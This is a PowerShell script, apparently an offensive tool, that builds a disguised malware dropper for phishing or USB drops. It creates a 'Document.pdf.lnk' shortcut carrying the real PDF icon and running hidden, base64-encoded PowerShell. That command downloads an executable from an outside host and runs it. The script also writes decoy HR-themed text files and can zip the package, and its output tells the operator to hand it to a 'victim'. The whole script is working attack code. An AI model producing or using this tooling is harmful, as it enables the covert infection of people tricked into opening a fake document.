param(
    [string]$Path = "",
    [switch]$Zip
)

# Generate the base64-encoded one-liner
$rawCmd = "iwr 'https://allseeing.netlify.app/a' -OutFile `$env:tmp\a.exe; start `$env:tmp\a.exe"
$encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
$encCmd = [Convert]::ToBase64String($encBytes)

if (!$Path) {
    $Path = Read-Host "Enter target path (USB drive or folder)"
    if (!$Path) { Write-Error "No path provided"; exit 1 }
}

# Resolve full path
$Path = [IO.Path]::GetFullPath($Path)
if (!(Test-Path $Path)) { Write-Error "Path does not exist: $Path"; exit 1 }

Write-Output "Generating payload in: $Path"

# Create LNK shortcut
$shell = New-Object -ComObject WScript.Shell
$lnk = $shell.CreateShortcut("$Path\Document.pdf.lnk")
$lnk.TargetPath = "powershell.exe"
$lnk.Arguments = "-w h -Enc $encCmd"
$lnk.WorkingDirectory = "%TEMP%"
$lnk.WindowStyle = 7

# Set PDF icon - query registry for the real PDF handler icon
$pdfIcon = $null
try {
    $progId = (Get-ItemProperty "Registry::HKEY_CLASSES_ROOT\.pdf" -Name "(default)" -ErrorAction Stop)."(default)"
    if ($progId) {
        $iconLine = (Get-ItemProperty "Registry::HKEY_CLASSES_ROOT\$progId\DefaultIcon" -Name "(default)" -ErrorAction SilentlyContinue)."(default)"
        if ($iconLine) { $pdfIcon = $iconLine }
    }
} catch {}

# Fallback: check common PDF readers
if (!$pdfIcon) {
    $pdfPaths = @(
        "C:\Program Files\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe, 0",
        "C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe, 0",
        "C:\Program Files\Adobe\Reader 11.0\Reader\AcroRd32.exe, 0",
        "C:\Program Files (x86)\Adobe\Reader 11.0\Reader\AcroRd32.exe, 0",
        "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe, 4",
        "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, 4",
        "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe, 4",
        "C:\Program Files\Google\Chrome\Application\chrome.exe, 4"
    )
    foreach ($entry in $pdfPaths) {
        $exe = ($entry -split ",")[0]
        if (Test-Path $exe) { $pdfIcon = $entry; break }
    }
}

# Ultimate fallback: shell32.dll document icon
if (!$pdfIcon) { $pdfIcon = "%SystemRoot%\system32\shell32.dll, 70" }

$lnk.IconLocation = $pdfIcon
$lnk.Save()
Write-Output "  [+] Document.pdf.lnk (icon: $pdfIcon)"

# Create decoy Document.txt
@"
This document contains confidential information.
For authorized personnel only.

Please review and sign the attached agreement.
"@ | Set-Content "$Path\Document.txt" -Encoding UTF8
Write-Output "  [+] Document.txt created"

# Create decoy README.txt
@"
Thank you for reviewing this document.
Please ensure all sections are completed
before the deadline.

If you have any questions, contact the HR department.
"@ | Set-Content "$Path\README.txt" -Encoding UTF8
Write-Output "  [+] README.txt created"

# Optional: zip the payload
if ($Zip) {
    $zipPath = "$Path\Document.zip"
    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
    Compress-Archive -Path "$Path\Document.pdf.lnk", "$Path\Document.txt", "$Path\README.txt" -DestinationPath $zipPath -CompressionLevel Optimal
    Write-Output "  [+] Document.zip created"
}

Write-Output ""
Write-Output "=== DELIVERY SUMMARY ==="
Write-Output "Folder: $Path"
Write-Output "Send the zip, or plug this USB into the target"
Write-Output "Victim sees: Document.pdf   (clicks it -> payload fires)"
Write-Output "=========================="